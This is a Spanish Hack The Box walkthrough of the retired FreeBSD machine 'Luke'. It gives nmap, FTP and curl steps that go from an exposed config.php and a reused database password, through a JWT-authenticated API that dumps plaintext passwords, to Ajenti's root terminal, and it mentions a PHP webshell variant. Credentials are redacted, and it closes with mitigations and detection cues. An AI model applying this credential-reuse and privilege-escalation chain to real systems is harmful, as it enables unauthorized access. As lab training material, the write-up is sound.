---
machine: Luke
os: FreeBSD
difficulty: Medium
platform: Hack The Box
category: Web / FreeBSD
state: Retired
tags: [freebsd, ftp, php, api, jwt, ajenti, credentials]
---

# Luke — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

FTP anónimo con el código de una webapp, un Apache que sirve `config.php` en claro porque ahí no se ejecuta PHP, una API Node en el 3000 y el panel Ajenti en el 8000. La contraseña de MySQL se reutiliza como contraseña del `admin` de la API; con su JWT se listan usuarios y sus contraseñas en claro, y la de `Derry` abre el basic auth de `/management`. Ese directorio expone `config.json` con la contraseña de `root` de Ajenti, y Ajenti corre como root: su terminal es la escalada.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 21,22,80,3000,8000 -sCV -oA nmap_svc <IP>
```

```text
21/tcp   open  ftp     vsftpd 3.0.3+ (anonymous allowed)
22/tcp   open  ssh     (banner no identificado)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
3000/tcp open  http    Node.js Express framework
8000/tcp open  http    Ajenti http control panel
```

- El FTP anónimo publica `webapp/` con el código y una nota firmada por "Derry" que menciona a Chihiro.
- La API del 3000 responde JSON y tiene su propio login.
- Ajenti es un panel de administración; el 8000 es el servicio que decide la escalada.

```bash
printf '%s\n' '<IP> luke.htb' | sudo tee -a /etc/hosts
```

## Enumeración

```bash
ftp -a <IP>              # anonymous
ftp> ls webapp
ftp> get webapp/for_Chihiro.txt
```

La nota es una pista de la autora del sitio: el código de la aplicación está en el FTP y la web lo referencia. Un barrido con extensiones encuentra `/config.php`, `/login.php`, `/member` y `/management`.

`/config.php` se sirve como texto plano: el Apache tiene PHP, pero ese fichero no se ejecuta en ese contexto, así que el código fuente con las credenciales de la base de datos se descarga tal cual.

```text
$dbUsername = 'root';
$dbPassword = '<PASSWORD>';
$db = "login";
```

## Foothold

La contraseña de MySQL está reutilizada como contraseña del usuario `admin` de la API:

```bash
curl -s -X POST http://luke.htb:3000/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<PASSWORD>"}'
```

Devuelve un JWT. Con él se enumeran las cuentas y la API entrega las contraseñas en claro:

```bash
curl -s http://luke.htb:3000/users -H 'Authorization: <JWT>'
curl -s http://luke.htb:3000/users/Derry -H 'Authorization: <JWT>'
```

```text
Derry · Web Admin · <PASSWORD>
```

`Derry` es la cuenta que abre el basic auth de `/management`:

```bash
curl -s -u 'Derry:<PASSWORD>' http://luke.htb:8000/management/
```

## Movimiento lateral

No hay un segundo host. El movimiento es de la API (usuario de aplicación) al panel de administración del mismo servidor, y de ahí a root.

## Escalada de privilegios

Dentro de `/management` está la configuración de Ajenti, `config.json`, con la contraseña del usuario `root` del panel:

```bash
curl -s -u 'Derry:<PASSWORD>' http://luke.htb:8000/management/config.json
```

Ajenti se ejecuta como root y su terminal no baja privilegios:

```text
usuario: root
contraseña: <PASSWORD>
```

Al abrir `Tools → Terminal → New` la sesión ya es de root:

```bash
id
# uid=0(root) gid=0(wheel)
```

La variante equivalente usa el gestor de ficheros del panel para dejar un webshell PHP en `/usr/local/www/apache24` y ejecutarlo desde la web; el resultado es el mismo porque el proceso del panel es root.

## Evidencia

- `ls` del FTP anónimo con `webapp/` y la nota.
- `config.php` descargado, con la contraseña redactada.
- `GET /users` con el JWT y la contraseña de `Derry` ya redactada.
- `config.json` con la contraseña de root recortada.
- `id` como root en la terminal de Ajenti.

## Lecciones aprendidas

- Un `.php` servido por un Apache con PHP no siempre se ejecuta: depende del `AddType`/handler del directorio, y el código fuente puede quedar expuesto.
- Reutilizar la contraseña de la base de datos en el panel y en la API multiplica el impacto de una sola fuga.
- Una API que devuelve contraseñas en claro convierte un JWT de usuario en un volcado de credenciales.
- Los paneles de administración que corren como root no necesitan exploit: la funcionalidad es la escalada.
- El FTP anónimo no es solo un share: aquí era el repositorio del código.

## Mitigaciones y detección

- Deshabilitar el FTP anónimo y no publicar código fuente; revisar que los `.php` con secretos se ejecuten o se saquen del árbol web.
- Usar credenciales distintas por servicio y almacenar hashes, nunca contraseñas reversibles.
- No devolver contraseñas por API; limitar `GET /users` a datos mínimos y auditar el acceso.
- Proteger `/management` con autenticación fuerte y ejecutar Ajenti como usuario sin privilegios.
- Detección: descargas de `config.php`/`config.json` en el access log; login anónimo de FTP; `POST /login` seguido de barridos de `/users`; accesos al 8000 desde la misma IP; procesos hijos de Ajenti con `uid=0`.

MITRE: T1552.001, T1078, T1550.001, T1087, T1059.004.

## Referencias

- <https://0xdf.gitlab.io/2019/09/14/htb-luke.html>
- <https://jebidiah-anthony.github.io/boxes/28_Luke.html>
- <https://godiego.co/posts/Luke>
- <https://attack.mitre.org/techniques/T1552/001/>
